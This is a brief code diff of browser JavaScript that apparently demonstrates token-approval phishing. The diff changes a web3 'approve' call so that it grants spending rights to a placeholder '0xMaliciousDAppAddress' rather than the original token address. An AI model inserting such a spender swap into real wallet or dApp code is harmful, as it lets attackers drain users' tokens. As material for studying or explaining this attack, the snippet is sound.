@@ -37,7 +37,7 @@
 
                 document.getElementById('status').innerText = "Sending approval transaction...";
                 await tokenContract.methods
-                    .approve("0xTokenAddress", "1000000000000000000") // 1 token
+                    .approve("0xMaliciousDAppAddress", "1000000000000000000") // 1 token
                     .send({ from: accounts[0] });
 
                 alert("Approval successful! Token spender: 0xMaliciousDAppAddress");
